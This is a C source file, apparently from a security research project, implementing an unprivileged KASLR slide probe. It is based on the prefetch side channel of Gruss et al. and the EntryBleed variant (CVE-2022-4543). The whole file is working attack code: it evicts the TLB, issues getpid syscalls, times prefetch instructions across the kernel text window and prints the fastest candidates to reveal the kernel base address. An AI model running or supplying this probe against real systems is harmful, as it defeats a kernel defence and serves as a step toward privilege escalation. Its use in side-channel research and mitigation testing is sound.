/*
 * M4b -- unprivileged KASLR slide probe: prefetch side channel (v2).
 *
 * Gruss et al., "Prefetch Side-Channel Attacks: Bypassing SMAP and
 * Kernel ASLR" (CCS 2016); EntryBleed variant for the syscall entry
 * page (CVE-2022-4543).
 *
 * v1 (kept in results/) measured a repeated min per candidate: the
 * prefetch itself fills the TLB, the statistic saturates at the floor
 * and the mapped/unmapped contrast dies after the first scan. v2 fixes
 * both problems:
 *
 *  - every pass first EVICTS the unified TLB by touching a large user
 *    buffer (one access per 4 KiB page), so each pass measures a cold
 *    candidate;
 *  - one single sample per candidate per pass, accumulated into a mean;
 *  - MODE=eb (default) issues a minimal syscall before every sample, so
 *    the page(s) of the syscall path are TLB-hot again while every other
 *    candidate pays a fresh translation. This is the EntryBleed oracle.
 *
 * The scan walks the text randomization window in PF_STEP (2 MiB) steps.
 * In MODE=eb the fastest candidate is the 2 MiB page containing the
 * syscall entry code (text base + public entry offset); in MODE=plain
 * the fast region marks the mapped kernel image (its start is the text
 * base). Both offsets are per-build constants from the public kernel
 * image.
 *
 * Env: PF_MIN, PF_MAX (default 0xffffffff80000000 .. 0xffffffffc0000000)
 *      PF_STEP (default 0x200000), PF_PASSES (default 500)
 *      PF_EVICT_MB (default 16), PF_MODE=eb|plain
 */

#define _GNU_SOURCE

#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>

#define MAXC 4096

static uint64_t env_u64(const char *n, uint64_t d)
{
	const char *s = getenv(n);

	return (s && s[0]) ? strtoull(s, NULL, 0) : d;
}

static inline uint64_t rdtscp(void)
{
	uint32_t lo, hi, aux;

	asm volatile("rdtscp" : "=a"(lo), "=d"(hi), "=c"(aux));
	return ((uint64_t)hi << 32) | lo;
}

static inline void do_syscall(void)
{
	/* getpid (39): minimal syscall; the syscall path executes on every
	 * call and keeps its text pages TLB-hot for the next sample. */
	asm volatile("syscall" :: "a"(39) : "rcx", "r11", "memory");
}

static inline uint64_t pf_time(uint64_t addr)
{
	uint64_t t0, t1;

	t0 = rdtscp();
	asm volatile("prefetchnta (%0)" :: "r"(addr));
	t1 = rdtscp();
	return t1 - t0;
}

int main(void)
{
	uint64_t lo = env_u64("PF_MIN", 0xffffffff80000000ull);
	uint64_t hi = env_u64("PF_MAX", 0xffffffffc0000000ull);
	uint64_t step = env_u64("PF_STEP", 0x200000ull);
	uint64_t passes = env_u64("PF_PASSES", 500);
	uint64_t evict_mb = env_u64("PF_EVICT_MB", 16);
	const char *m = getenv("PF_MODE");
	int eb = !(m && m[0] && !strcmp(m, "plain"));
	uint64_t addr[MAXC], sum[MAXC], mn[MAXC];
	unsigned char *ev;
	uint64_t i, p, evbytes;
	int n = 0;
	volatile unsigned char sink = 0;

	evbytes = evict_mb << 20;
	ev = mmap(NULL, evbytes, PROT_READ | PROT_WRITE,
		  MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (ev == MAP_FAILED) {
		perror("mmap");
		return 2;
	}
	for (i = 0; i < evbytes; i += 4096)
		sink ^= ev[i];

	for (i = 0; i < MAXC; i++) {
		uint64_t a = lo + i * step;

		if (a >= hi)
			break;
		addr[n] = a;
		sum[n] = 0;
		mn[n] = ~0ull;
		n++;
	}

	for (p = 0; p < passes; p++) {
		int fwd = (p & 1) == 0;
		int k;

		for (i = 0; i < evbytes; i += 4096)
			sink ^= ev[i];
		for (k = 0; k < n; k++) {
			int idx = fwd ? k : n - 1 - k;
			uint64_t t;

			if (eb)
				do_syscall();
			t = pf_time(addr[idx]);
			sum[idx] += t;
			if (t < mn[idx])
				mn[idx] = t;
		}
	}

	for (i = 0; i < (uint64_t)n; i++)
		printf("0x%016llx %6llu %5llu\n", (unsigned long long)addr[i],
		       (unsigned long long)(sum[i] / passes),
		       (unsigned long long)mn[i]);
	printf("mode=%s candidates=%d passes=%llu\n", eb ? "eb" : "plain",
	       n, (unsigned long long)passes);

	{
		int b0 = -1, b1 = -1, b2 = -1, k;

		for (k = 0; k < n; k++) {
			uint64_t v = sum[k];

			if (b0 < 0 || v < sum[b0]) {
				b2 = b1;
				b1 = b0;
				b0 = k;
			} else if (b1 < 0 || v < sum[b1]) {
				b2 = b1;
				b1 = k;
			} else if (b2 < 0 || v < sum[b2]) {
				b2 = k;
			}
		}
		if (b0 >= 0)
			printf("mean rank 1: 0x%016llx %llu\n",
			       (unsigned long long)addr[b0],
			       (unsigned long long)(sum[b0] / passes));
		if (b1 >= 0)
			printf("mean rank 2: 0x%016llx %llu\n",
			       (unsigned long long)addr[b1],
			       (unsigned long long)(sum[b1] / passes));
		if (b2 >= 0)
			printf("mean rank 3: 0x%016llx %llu\n",
			       (unsigned long long)addr[b2],
			       (unsigned long long)(sum[b2] / passes));
	}
	(void)sink;
	return 0;
}
